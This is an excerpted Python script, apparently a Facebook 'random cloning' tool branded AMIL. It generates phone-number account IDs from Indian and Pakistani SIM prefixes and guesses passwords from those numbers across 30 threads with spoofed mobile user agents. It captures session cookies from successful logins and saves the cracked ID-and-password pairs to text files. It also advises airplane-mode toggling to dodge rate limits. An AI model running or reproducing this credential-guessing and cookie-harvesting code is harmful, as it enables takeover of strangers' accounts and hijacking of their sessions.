...
for xd in range(10000):
    ...
    l=' Chrome/112.0.5615.136 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.36.1-gn'
...
ua_default = 'Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36'
ua_samsung = 'Mozilla/5.0 (Linux; Android 6.0.1; SM-G900I Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24.77;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 11; Mi 9T Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 8.1.0; CPH1809 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/396.0.0.14.82;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1906 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]'
ua_iphone  = 'Mozilla/5.0 (iPad; CPU iPhone OS 12_5_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Version/12.5.5 Safari/605.1.15 AlohaBrowser/3.1.0'
...
logo = """       
\033[1;97m .d8b.  .88b  d88. d888888b db      
\033[1;97md8' `8b 88'YbdP`88   `88'   88      
\033[1;97m88ooo88 88  88  88    88    88      
\033[1;97m88~~~88 88  88  88    88    88      
\033[1;97m88   88 88  88  88   .88.   88booo. 
\033[1;97mYP   YP YP  YP  YP Y888888P Y88888P \033[1;32m INDIA
...
def menu():
	...
	print(logo)
	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
	print('[1] \033[1;32mRANDOM CLONING ')
	print('[2] \033[1;32mFOLLOWE MY FB')
	print('[0] \033[1;32mEXIT')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()
...
def random_crack():
	os.system('clear')
	print(logo)
	print('[1]\033[1;37m INDIA RANDOM CLONE')
	print('[2]\033[1;37m PAK  RANDOM CLONE')
	print('[0]\033[1;37m BANGAL RANODOM CLONE')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;35m INDIA code : 9670,9919,9918,8795,9915")
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print(47*'-')
		print('[+]\033[1;97m TOTAL YOUR IDS  : \033[1;92m'+tl)
		print('[?] \033[1;97mCHOICE SIM CODE : \033[1;32m'+kode)
		print('\033[1;97m[•] CHOICE YUR CONTORY :(\033[1;32mINDIA\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
...
def rcrack(uid,pwx,tl):
    ...
    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="116.0.5741.204", "Google Chrome";v="116.0.5741.204"',
    'sec-ch-ua-mobile': '?1',
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 9; SM-T387V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5797.197 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[7:22]
				print('\033[1;92m[AMIL-OK] '+uid+' | '+ps+'\033[0;97m')
				print(f"\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('AMIL-OK.txt', 'a').write(uid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\n\033[1;91m[AMIL-CP] '+uid+' | '+ps+'\033[0;97m')
				...
				continue
		loop+=1
		sys.stdout.write(f'\r\033[m[AMIL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
		sys.stdout.flush()
	except:
		pass
...
def random_pak_number():
	...
	os.system('clear')
	print(logo)
	print('[+] \033[1;35mPK code  : 92303,92306,92309,92305,92307')
	print(47*'-')
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		tl = str(len(user))
		print(47*'-')
		print('[+]\x1b[1;91m YOUR TOTAL IDS : \033[1;92m'+tl)
		print('[?] CHOICE SIM CODE : \033[1;32m'+kode)
		print('\x1b[1;91m[•] YOUR CONTORY (\033[1;32mPakistan\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
...
def rcrack(uid,pwx,tl):
    ...
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-T500) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5794.196 Mobile Safari/537.36',}
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[AMIL-CP] '+uid+' | '+ps+'\033[0;97m')
				#print(f"\n\033[1;33mCOOKIE : \033[1;37m{coki}")
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
				...
				continue
		loop+=1
		sys.stdout.write('\r[\033[1;92mAMIL\033[1;97m] [%s/%s]>[\033[1;32mOK\033[1;97m:-\033[1;92m%s\033[1;97m]-[CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
menu() 